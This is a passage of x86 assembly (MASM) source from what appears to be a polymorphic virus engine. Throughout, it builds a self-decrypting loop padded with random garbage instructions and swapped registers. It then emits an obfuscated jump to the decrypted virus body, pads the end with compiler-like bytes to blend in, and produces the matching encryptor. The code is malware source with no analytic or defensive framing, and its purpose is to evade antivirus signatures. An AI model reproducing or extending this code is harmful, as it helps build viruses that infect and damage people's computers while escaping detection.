        Invoke Assembl, ASM_MOV,dEip,Byte Ptr [Temp1],Dl,R_RM Or RM_REG,0,0
        Mov dEip,Edi
        Invoke Rand,nIns        ;more easier than manglo
        .If nIns==0
            Xor Eax,Eax         ;very important
        .EndIf
        Sub nIns,Eax
        Mov Edx,NO_REGSWAPPING
        Invoke GarPJ, Eax,dEip,HeapPtr,Edx
        Mov dEip,Eax
        Mov Edi,HeapPtr
        Movzx Edx,[Edi].RWPolyData.UsedRegs
        Dec Edx
        Dec RegCounter
        ;put swap the counter
        Invoke Assembl, ASM_MOV,dEip,RegCounter,Dl,R_RM Or RM_REG,0,0
        Mov dEip,Edi
        Mov Edi,HeapPtr
        Dec RegPointer
        Invoke Rand,nIns        ;more easier than manglo
        .If nIns==0
            Xor Eax,Eax         ;very important
        .EndIf
        Sub nIns,Eax
        Mov Edx,NO_REGSWAPPING
        Invoke GarPJ, Eax,dEip,HeapPtr,Edx
        Mov dEip,Eax
        ;now swap the pointer with the new register that we swapped with before
        Invoke Assembl, ASM_MOV,dEip,RegPointer,Byte Ptr [Temp1],R_RM Or RM_REG,0,0
        Mov dEip,Edi
        Invoke Rand,nIns        ;more easier than manglo
        .If nIns==0
            Xor Eax,Eax         ;very important
        .EndIf
        Sub nIns,Eax
        Mov Edx,NO_REGSWAPPING
        Invoke GarPJ, Eax,dEip,HeapPtr,Edx
        Mov dEip,Eax
    .Else
        Movzx Eax,[Edi].RWPolyData.UsedRegs
        .If !(Al==RegCounter)
            Movzx Edx,[Edi].RWPolyData.UsedRegs
            Dec Edx
            Dec RegCounter
            Invoke Assembl, ASM_MOV,dEip,RegCounter,Dl,R_RM Or RM_REG,0,0
            Mov dEip,Edi
        .Else
            Dec RegCounter      ;that's for "cmp" before jb of the loop
        .EndIf
        Mov Edi,HeapPtr
        Invoke Rand,nIns        ;more easier than manglo
        .If nIns==0
            Xor Eax,Eax         ;very important
        .EndIf
        Sub nIns,Eax
        Mov Edx,NO_REGSWAPPING
        Invoke GarPJ, Eax,dEip,HeapPtr,Edx
        Mov dEip,Eax
        Mov Edi,HeapPtr
        Movzx Eax,[Edi+1].RWPolyData.UsedRegs
        .If !(Al==RegPointer) && !(Eax==0)
            Movzx Edx,[Edi+1].RWPolyData.UsedRegs
            Dec Edx
            Dec RegPointer
            Invoke Assembl, ASM_MOV,dEip,RegPointer,Dl,R_RM Or RM_REG,0,0
            Mov dEip,Edi
        .EndIf
        Invoke Rand,nIns        ;more easier than manglo
        .If nIns==0
            Xor Eax,Eax         ;very important (avoid negative numbers like 0FFH)
        .EndIf
        Sub nIns,Eax
        Mov Edx,NO_REGSWAPPING
        Invoke GarPJ, Eax,dEip,HeapPtr,Edx
        Mov dEip,Eax
    .EndIf
    Mov Edi,HeapPtr
    Invoke Assembl, ASM_CMP,dEip,RegCounter,0,R_IMM,0,[Edi].RWPolyData.VirusSize
    Mov dEip,Edi
    ;now we will write the jmp of the loop
    Mov Edx,dEip
    Add Edx,6       ;the size of jb instruction (jmp-->5 bytes but jb-->6 bytes)
    Sub Edx,JmpPtr  ;the place where the jmp will point to
    Neg Edx
    Invoke Assembl, ASM_JB,dEip,0,0,REL_ADDR,0,Edx
    Mov dEip,Edi
    Invoke GarPJ, nIns,dEip,HeapPtr,NO_REGSWAPPING
    Mov dEip,Eax
    ;let's write for the encryptor
    Mov Edi,HeapPtr
    Invoke Assembl, ASM_CMP,enEip,REG_ECX,0,R_IMM,0,[Edi].RWPolyData.VirusSize
    Mov enEip,Edi
    Mov Edx,enEip
    Add Edx,6       ;the size of jb instruction (3 only because it's a short jmp <127)
    Sub Edx,enJmpPtr    ;the place where the jmp will point to
    Neg Edx
    Invoke Assembl, ASM_JB,enEip,0,0,REL_ADDR,0,Edx
    Mov enEip,Edi
;-----------------------------------------------------------------------------------------------
            ;=*-=*-=*-=*-=*-= VIRUS JUMP INSTRUCTIONS =*-=*-=*-=*-=*-=;
    .If !(VirusPointer==0)
        Mov Edi,HeapPtr
        Lea Eax,[Edi].RWPolyData.GarManglo
        Mov Ecx,GarIndex
        Add Eax,Ecx
        Add GarIndex,4
        Mov Eax,DWord Ptr [Eax]
        Mov nIns,Eax
        ;this place should become after the jmp of the loop
        Invoke Rand, nIns
        .If nIns==0
            Xor Eax,Eax         ;very important
        .EndIf
        Sub nIns,Eax
        Invoke GarPJ, Eax,dEip,HeapPtr,0
        Mov dEip,Eax
        ;here we will make the jmp to the virus after it decrypted
        ;we will use one of these mov eax,XXX jmp eax OR lea eax,[XXX] jmp eax
        ;we will make this register in UsedRegs to be able to swapped (Dynamic Register Swapping)
        Invoke GetValidReg, 0       ;no register affected there
        Mov Temp1,Eax
        Mov Edx,1
        Mov Ecx,Eax
        Shl Edx,Cl
        Mov [Edi].RWPolyData.AffectedRegs,Dl        ;reserve the register and remove any affected register
        Inc Eax
        Mov DWord Ptr [Edi].RWPolyData.UsedRegs,0       ;make sure no other usedregs
        Mov [Edi].RWPolyData.UsedRegs,Al        ;save it as the pointer
        Invoke Rand,0
        Mov Temp2,Eax
        Invoke Rand, 2
        .If Eax==0
            Invoke Assembl, ASM_MOV,dEip,Byte Ptr [Temp1],0,R_IMM,0,Temp2
            Mov dEip,Edi
        .Else
            Invoke Assembl, ASM_LEA,dEip,Byte Ptr [Temp1],0,R_RM Or RM_NOREG,Temp2,0
            Mov dEip,Edi
        .EndIf
        Invoke Rand,nIns        ;more easier than manglo
        .If nIns==0
            Xor Eax,Eax         ;very important
        .EndIf
        Sub nIns,Eax
        Invoke GarPJ, Eax,dEip,HeapPtr,NO_NEGATIVEPATTERN   ;because it will use the our register as a counter and maybe make it run
        Mov dEip,Eax
        Mov Edi,HeapPtr
        Movzx Eax,[Edi].RWPolyData.UsedRegs
        Dec Eax
        Mov Temp1,Eax
        Invoke Rand, 3
        .If Eax==0  ;Add/ Sub/ Xor
            ;add edi,XXXXXXXX
            Mov Eax,VirusPointer
            Sub Eax,Temp2                   ;calculating the difference
            Mov Temp2,Eax
            Invoke Assembl, ASM_ADD,dEip,Byte Ptr [Temp1],0,R_IMM,0,Temp2
            Mov dEip,Edi
        .ElseIf Eax==1
            ;sub edi,XXXXXXXX
            Mov Eax,VirusPointer
            Sub Eax,Temp2
            Neg Eax
            Mov Temp2,Eax
            Invoke Assembl, ASM_SUB,dEip,Byte Ptr [Temp1],0,R_IMM,0,Temp2
            Mov dEip,Edi
        .Else
            ;Xor edi,XXXXXXXX
            Mov Eax,VirusPointer
            Xor Eax,Temp2
            Mov Temp2,Eax
            Invoke Assembl, ASM_XOR,dEip,Byte Ptr [Temp1],0,R_IMM,0,Temp2
            Mov dEip,Edi
        .EndIf
        Invoke Rand,nIns        ;more easier than manglo
        .If nIns==0
            Xor Eax,Eax         ;very important
        .EndIf
        Sub nIns,Eax
        Invoke GarPJ, Eax,dEip,HeapPtr,0
        Mov dEip,Eax
        Mov Edi,HeapPtr
        Movzx Eax,[Edi].RWPolyData.UsedRegs
        Dec Eax
        Mov Edx,Eax
        Invoke Assembl, ASM_CALL,dEip,0,Dl,RM_IMM Or RM_REG,0,0
        Mov dEip,Edi
        Mov Edi,HeapPtr
        Mov [Edi].RWPolyData.AffectedRegs,0
        Mov Edx,NO_REGSWAPPING
        Invoke GarPJ, nIns,dEip,HeapPtr,Edx
        Mov dEip,Eax
    .EndIf
;-----------------------------------------------------------------------------------------------
        ;=*-=*-=*-=*-=*-= FUNCTION EPILOGUE INSTRUCTIONS =*-=*-=*-=*-=*-=;
    Mov Edi,HeapPtr
    Lea Edx,[Edi].RWPolyData.Decryptor
    Add Edx,DecryptorSize       ;the pointer to the last bye in the code
    Mov Temp1,Edx
    Sub Edx,12H     ;15 bytes for alignment bytes (like C++ they write at the end int3 "CC") and 2 for leave and Ret
    .While dEip <= Edx
        Invoke GarPJ, 3,dEip,HeapPtr,NO_REGSWAPPING
        Mov dEip,Eax
    .EndW
    Invoke Assembl, ASM_LEAVE,dEip,0,0,0,0,0
    Mov dEip,Edi
    Invoke Assembl, ASM_RET,dEip,0,0,0,0,0
    Mov dEip,Edi
    Mov Ecx,Temp1
    Sub Ecx,dEip    ;the remeaning bytes
    Inc Ecx
    .If !(Ecx & 80000000H)      ;not negative
        Mov Eax,0CCH    ;what usually C++ write at the end
        Rep Stosb
    .EndIf
    ;at last for the encryptor
    Invoke Assembl, ASM_LEAVE,enEip,0,0,0,0,0
    Mov enEip,Edi
    Invoke Assembl, ASM_RET,enEip,0,0,0,0,0
    Mov enEip,Edi
    Mov Edi,HeapPtr
    Mov Eax,enEip
    Mov [Edi].RWPolyData.EncryptorPtr,Eax
    Ret
Eagle EndP
